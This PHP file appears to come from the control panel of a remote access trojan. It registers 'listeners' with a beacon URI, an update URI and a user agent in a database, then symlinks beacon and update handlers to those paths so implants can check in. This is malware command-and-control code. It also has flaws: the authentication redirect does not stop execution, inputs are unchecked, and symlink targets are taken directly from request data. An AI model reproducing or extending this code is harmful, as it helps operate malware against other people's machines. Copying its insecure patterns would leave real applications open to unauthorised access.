<?php
    # Necessary at the top of every page for session management
    session_start();

    include "connector.php";

    # If unauthenticated
    if (!isset($_SESSION["authenticated"])) {
        header("Location: 403.php");
    }
    
    # TO DO: Need input checks for missing parameters

    # TO DO: Validate inputs (a string instead of an int, etc)

    # TO DO: Need check for an already existing entry in "listeners" table

    $address = $_POST["address"];
    $port = $_POST["port"];
    $protocol = $_POST["protocol"];
    $beacon_uri = $_POST["beaconuri"];
    $update_uri = $_POST["updateuri"];
    $user_agent = $_POST["useragent"];

    # Creates entry in "listeners" table
    $statement = $database_connection->prepare("INSERT INTO listeners (`external_address`, `protocol`, `port`, `beacon_uri`, `update_uri`, `user_agent`) VALUES (:external_address, :protocol, :port, :beacon_uri, :update_uri, :user_agent)");
    $statement->bindValue(":external_address", $address);
    $statement->bindValue(":port", $port);
    $statement->bindValue(":protocol", $protocol);
    $statement->bindValue(":beacon_uri", $beacon_uri);
    $statement->bindValue(":update_uri", $update_uri);
    $statement->bindValue(":user_agent", $user_agent);
    $statement->execute();
    $statement->connection = null;

    # Creates symbolic links to "beacon.php" and "update.php"
    symlink("beacon.php", $beacon_uri);
    symlink("update.php", $update_uri);  

    # Redirects user back to "listeners.php"
    header("Location: listeners.php");

    # TO DO: Add in success alert so the RAT admin knows the listener was created
?>